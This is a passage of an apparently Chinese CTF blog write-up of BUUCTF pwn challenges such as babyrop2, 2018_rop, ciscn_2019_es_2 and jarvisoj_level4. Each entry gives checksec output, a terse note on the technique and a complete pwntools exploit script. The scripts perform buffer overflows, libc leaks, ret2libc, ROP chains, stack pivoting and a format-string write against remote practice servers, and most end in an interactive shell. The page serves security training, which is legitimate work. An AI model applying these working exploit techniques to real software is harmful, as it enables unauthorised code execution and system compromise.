class="line">payload&#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;+&#39;a&#39;*8+p64(mov_rax_ret)+p64(gadget_one)+p64(0)+p64(0x1)+p64(mov_rax)+p64(0)+p64(0)+p64(0)+p64(gadget_two)+&#39;a&#39;*56+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(syscall)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="babyrop2"><a href="#babyrop2" class="headerlink" title="babyrop2"></a>babyrop2</h3><h4 id="checksec检查：-6"><a href="#checksec检查：-6" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-9"><a href="#利用：-9" class="headerlink" title="利用："></a>利用：</h4><p>泄露libc，然后就one_gadget，没啥好说的。这里要注意用printf泄露<code>rdi=%s</code>，<code>rsi=泄露地址</code></p>
<h4 id="exp如下：-8"><a href="#exp如下：-8" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;babyrop2&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,25016)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;babyrop2&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line"></span><br><span class="line">read_got&#x3D;elf.got[&#39;read&#39;]</span><br><span class="line">printf_plt&#x3D;elf.plt[&#39;printf&#39;]</span><br><span class="line">pop_rdi_ret&#x3D;0x0000000000400733</span><br><span class="line">pop_rsi_r15_ret&#x3D;0x0000000000400731</span><br><span class="line">format_addr&#x3D;0x0000000000400790</span><br><span class="line">main_addr&#x3D;0x0000000000400636</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;What&#39;s your name? &quot;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x28+p64(pop_rdi_ret)+p64(format_addr)+p64(pop_rsi_r15_ret)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr&#x3D;u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;read_addr : &#39; +hex(read_addr))</span><br><span class="line">libc_base&#x3D;read_addr-libc.symbols[&#39;read&#39;]</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">one_gadget&#x3D;libc_base+0xf02a4</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;What&#39;s your name? &quot;)</span><br><span class="line"></span><br><span class="line">payload1&#x3D;&#39;a&#39;*0x28+p64(one_gadget)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h3><h4 id="checksec检查：-7"><a href="#checksec检查：-7" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-10"><a href="#利用：-10" class="headerlink" title="利用："></a>利用：</h4><p>整数溢出漏洞，导致栈溢出。</p>
<h4 id="exp如下：-9"><a href="#exp如下：-9" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pwn2_sctf_2016&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,28201)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch &#x3D; &#39;i386&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn2_sctf_2016&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">format_addr&#x3D;0x080486F8</span><br><span class="line">printf_plt&#x3D;elf.plt[&#39;printf&#39;]</span><br><span class="line">printf_got&#x3D;elf.got[&#39;printf&#39;]</span><br><span class="line">main_addr&#x3D;0x080485B8</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;How many bytes do you want me to read? &#39;)</span><br><span class="line">sh.sendline(&#39;-1&#39;)</span><br><span class="line">sh.recvuntil(&#39;Ok, sounds good. Give me 4294967295 bytes of data!\n&#39;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x2c+&#39;a&#39;*0x4+p32(printf_plt)+p32(main_addr)+p32(format_addr)+p32(printf_got)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">printf_addr &#x3D; u32(sh.recvuntil(&#39;\xf7&#39;)[-4:])</span><br><span class="line">sh.success(&#39;printf_addr : &#39; +hex(printf_addr))</span><br><span class="line">libc_base&#x3D;printf_addr-libc.symbols[&#39;printf&#39;]</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line">#system_addr&#x3D;libc_base+0x03adb0</span><br><span class="line">#bin_sh_addr&#x3D;libc_base+0x15bb0b</span><br><span class="line">one_gadget&#x3D;libc_base+0x5f066</span><br><span class="line">sh.recvuntil(&#39;How many bytes do you want me to read? &#39;)</span><br><span class="line">sh.sendline(&#39;-1&#39;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Ok, sounds good. Give me 4294967295 bytes of data!\n&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x2c+&#39;a&#39;*0x4+p32(one_gadget)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="2018-rop"><a href="#2018-rop" class="headerlink" title="2018_rop"></a>2018_rop</h3><h4 id="checksec检查：-8"><a href="#checksec检查：-8" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<p>栈溢出，泄露libc，很简单 不说了。</p>
<h4 id="exp如下：-10"><a href="#exp如下：-10" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;2018_rop&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,25922)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;2018_rop&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc32&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch &#x3D; &#39;i386&#39;</span><br><span class="line">write_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">write_got&#x3D;elf.got[&#39;write&#39;]</span><br><span class="line">main_addr&#x3D;0x080484C6</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x88+&#39;a&#39;*0x4+p32(write_plt)+p32(main_addr)+p32(0x1)+p32(write_got)+p32(0x4)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">write_addr&#x3D;u32(sh.recv(4))</span><br><span class="line">sh.success(&#39;write_addr : &#39; +hex(write_addr))</span><br><span class="line">obj &#x3D; LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line">libc_base &#x3D; write_addr - obj.dump(&#39;write&#39;)</span><br><span class="line">system &#x3D; libc_base + obj.dump(&#39;system&#39;)</span><br><span class="line">binsh &#x3D; libc_base + obj.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * (0x88 + 4)</span><br><span class="line">payload +&#x3D; p32(system)</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line">payload +&#x3D; p32(binsh)</span><br><span class="line"></span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h3><h4 id="checksec检查：-9"><a href="#checksec检查：-9" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-11"><a href="#利用：-11" class="headerlink" title="利用："></a>利用：</h4><p>没啥好说的。</p>
<h4 id="exp如下：-11"><a href="#exp如下：-11" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;bjdctf_2020_babyrop&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29609)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;bjdctf_2020_babyrop&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">puts_plt&#x3D;elf.plt[&#39;puts&#39;]</span><br><span class="line">puts_got&#x3D;elf.got[&#39;puts&#39;]</span><br><span class="line">main_addr&#x3D;0x00000000004006AD</span><br><span class="line">pop_ret&#x3D;0x0000000000400733</span><br><span class="line">sh.recvuntil(&#39;Pull up your sword and tell me u story!\n&#39;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x20+&#39;a&#39;*0x8+p64(pop_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">puts_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;puts_addr : &#39; +hex(puts_addr))</span><br><span class="line">obj &#x3D; LibcSearcher(&#39;puts&#39;,puts_addr)</span><br><span class="line">libc_base &#x3D; puts_addr - obj.dump(&#39;puts&#39;)</span><br><span class="line">system &#x3D; libc_base + obj.dump(&#39;system&#39;)</span><br><span class="line">binsh &#x3D; libc_base + obj.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; *0x20+&#39;a&#39;*0x8</span><br><span class="line">payload +&#x3D; p64(pop_ret)</span><br><span class="line">payload +&#x3D; p64(binsh)</span><br><span class="line">payload +&#x3D; p64(system)</span><br><span class="line"></span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h3><h4 id="checksec-检查："><a href="#checksec-检查：" class="headerlink" title="checksec 检查："></a>checksec 检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h4 id="利用：-12"><a href="#利用：-12" class="headerlink" title="利用："></a>利用：</h4><p>需要注意的是<code>lea     eax, [ebp+dest]</code>这里，用IDA点开发现在栈上的0x32处，这里IDA有错误。</p>
<h4 id="exp如下：-12"><a href="#exp如下：-12" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;pz_hackover_2016&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,28754)</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pz_hackover_2016&#39;)</span><br><span class="line">printf_got &#x3D; elf.got[&#39;printf&#39;]</span><br><span class="line">printf_plt &#x3D; elf.plt[&#39;printf&#39;]</span><br><span class="line">main_addr&#x3D;0x080486E2</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">payload&#x3D;payload &#x3D; &#39;crashme&#39;.ljust(26, &#39;\x00&#39;) + p32(printf_plt) + p32(main_addr) + p32(0x8048845) + p32(printf_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Welcome&#39;)</span><br><span class="line">sh.recvuntil(&#39;Welcome &#39;)</span><br><span class="line">printf_addr &#x3D; u32(sh.recv(4))</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;printf&#39;, printf_addr)</span><br><span class="line">libc_base &#x3D; printf_addr - libc.dump(&#39;printf&#39;)</span><br><span class="line">system_addr &#x3D; libc_base + libc.dump(&#39;system&#39;)</span><br><span class="line">bin_sh_str &#x3D; libc_base + libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line">payload1 &#x3D; &#39;crashme&#39;.ljust(26,&#39;\x00&#39;) + p32(system_addr) + p32(0) + p32(bin_sh_str)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">连上就有flag</span><br></pre></td></tr></table></figure>

<h3 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h3><h4 id="checksec检查：-10"><a href="#checksec检查：-10" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-13"><a href="#利用：-13" class="headerlink" title="利用："></a>利用：</h4><p>只能够溢出到返回地址，想到栈迁移，俩次输入，第一次可以输入到ebp之前，printf遇到’\x00’才会终止输出，这也会打印ebp的栈的地址。第二次输入进行栈迁移。</p>
<h4 id="exp如下：-13"><a href="#exp如下：-13" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;remote(&quot;node3.buuoj.cn&quot;,27732)</span><br><span class="line">#sh&#x3D;process(&quot;ciscn_2019_es_2&quot;)</span><br><span class="line">context(arch&#x3D;&#39;i386&#39;,os&#x3D;&#39;linux&#39;,log_level&#x3D;&#39;debug&#39;)</span><br><span class="line"></span><br><span class="line">sys&#x3D;0x8048400</span><br><span class="line">leave_ret&#x3D;0x08048562</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;Welcome, my friend. What&#39;s your name?&quot;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x20+&#39;b&#39;*8</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(&quot;b&quot;*8)</span><br><span class="line">ebp&#x3D;u32(sh.recv(4))</span><br><span class="line">payload2&#x3D;&#39;a&#39;*4+p32(sys)+p32(0xdeadbeef)+p32(ebp-0x28)+&quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">payload2&#x3D;payload2.ljust(0x28,&#39;\x00&#39;)</span><br><span class="line">payload2+&#x3D;p32(ebp-0x38)+p32(leave_ret)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Black-Watch"><a href="#Black-Watch" class="headerlink" title="Black_Watch"></a>Black_Watch</h3><h4 id="checksec检查：-11"><a href="#checksec检查：-11" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-14"><a href="#利用：-14" class="headerlink" title="利用："></a>利用：</h4><p>栈迁移</p>
<h4 id="exp如下：-14"><a href="#exp如下：-14" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&quot;debug&quot;</span><br><span class="line">#sh &#x3D; process(&quot;.&#x2F;spwn&quot;)</span><br><span class="line">sh&#x3D;remote(&quot;node3.buuoj.cn&quot;,29363)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;spwn&quot;)</span><br><span class="line"></span><br><span class="line">bss_s_addr &#x3D; 0x0804A300</span><br><span class="line">leave_ret_addr &#x3D; 0x08048408</span><br><span class="line">write_got &#x3D; elf.got[&quot;write&quot;]</span><br><span class="line">write_plt &#x3D; elf.plt[&quot;write&quot;]</span><br><span class="line">main_addr &#x3D; elf.symbols[&quot;main&quot;]</span><br><span class="line"></span><br><span class="line">payload1 &#x3D; p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)</span><br><span class="line">payload2 &#x3D; &quot;a&quot;*0x18 + p32(bss_s_addr-4) + p32(leave_ret_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;What is your name?&quot;)</span><br><span class="line">sh.send(payload1)</span><br><span class="line">sh.recvuntil(&quot;What do you want to say?&quot;)</span><br><span class="line">sh.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr &#x3D; u32(sh.recv(4))</span><br><span class="line">log.success(&quot;write_addr &#x3D;&gt;&#123;&#125;&quot;.format(hex(write_addr)))</span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;, write_addr)</span><br><span class="line">libc_base &#x3D; write_addr - libc.dump(&quot;write&quot;)</span><br><span class="line">sys_addr &#x3D; libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">bin_sh_addr &#x3D; libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"></span><br><span class="line">payload3 &#x3D; p32(sys_addr) + p32(main_addr) + p32(bin_sh_addr)</span><br><span class="line">sh.recvuntil(&quot;What is your name?&quot;)</span><br><span class="line">sh.send(payload3)</span><br><span class="line">sh.recvuntil(&quot;What do you want to say?&quot;)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h3><h4 id="checksec检查：-12"><a href="#checksec检查：-12" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-15"><a href="#利用：-15" class="headerlink" title="利用："></a>利用：</h4><p>没啥好讲的</p>
<h4 id="exp如下：-15"><a href="#exp如下：-15" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;level3&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,28946)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;level3&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">write_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">write_got&#x3D;elf.got[&#39;write&#39;]</span><br><span class="line">main_addr&#x3D;elf.symbols[&#39;main&#39;]</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x88+&#39;a&#39;*4+p32(write_plt)+p32(main_addr)+p32(0x1)+p32(write_got)+p32(0x4)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&#39;Input:\n&#39;)</span><br><span class="line">write_addr&#x3D;u32(sh.recv(4))</span><br><span class="line">sh.success(&#39;write_addr : &#39; +hex(write_addr))</span><br><span class="line">libc&#x3D;LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line">libc_base&#x3D;write_addr-libc.dump(&#39;write&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">bin_addr&#x3D;libc_base+libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x88+&#39;a&#39;*4+p32(system_addr)+p32(0)+p32(bin_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h3><h4 id="checksec检查：-13"><a href="#checksec检查：-13" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-16"><a href="#利用：-16" class="headerlink" title="利用："></a>利用：</h4><p>格式化字符串，将x修改为4就好了，这里偏移是11</p>
<h4 id="exp如下：-16"><a href="#exp如下：-16" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;fm&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27282)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;fm&#39;)</span><br><span class="line">x_addr &#x3D; 0x0804A02C</span><br><span class="line"></span><br><span class="line">payload &#x3D; p32(x_addr) + &#39;%11$n&#39;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h3><h4 id="checksec检查：-14"><a href="#checksec检查：-14" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-17"><a href="#利用：-17" class="headerlink" title="利用："></a>利用：</h4><p>没啥说的，简单题。</p>
<h4 id="exp如下：-17"><a href="#exp如下：-17" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;guestbook&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27059)</span><br><span class="line"></span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;guestbook&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">good_game&#x3D;0x0000000000400620 </span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;Input your message:\n&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x88+p64(good_game)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a>jarvisoj_level4</h3><h4 id="checksec检查：-15"><a href="#checksec检查：-15" class="headerlink" title="checksec检查："></a>checksec检查：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h4 id="利用：-18"><a href="#利用：-18" class="headerlink" title="利用："></a>利用：</h4><p>延迟绑定了解一下。qaq</p>
<h4 id="exp如下：-18"><a href="#exp如下：-18" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;process(&#39;.&#x2F;level4&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27391)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;level4&#39;)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">write_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">write_got&#x3D;elf.got[&#39;write&#39;]</span><br><span class="line">main_addr&#x3D;elf.symbols[&#39;main&#39;]</span><br><span class="line"></span><br><span class="line">payload1&#x3D;&#39;a&#39;*0x88+&#39;a&#39;*4+p32(main_addr)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x88+&#39;a&#39;*4+p32(write_plt)+p32(main_addr)+p32(0x1)+p32(write_got)+p32(0x4)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">write_addr&#x3D;u32(sh.recv(4))</span><br><span class="line">sh.success(&#39;write_addr : &#39; +hex(write_addr))</span><br><span class="line">libc&#x3D;LibcSearcher(&#39;write&#39;,write_addr)</span><br><span class="line">libc_base&#x3D;write_addr-libc.dump(&#39;write&#39;)</span><br><span class="line">system_addr&#x3D;libc_base+libc.dump(&#39;system&#39;)</span><br><span class="line">bin_addr&#x3D;libc_base+libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;a&#39;*0x88+&#39;a&#39;*4+p32(system_addr)+p32(0)+p32(bin_addr)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

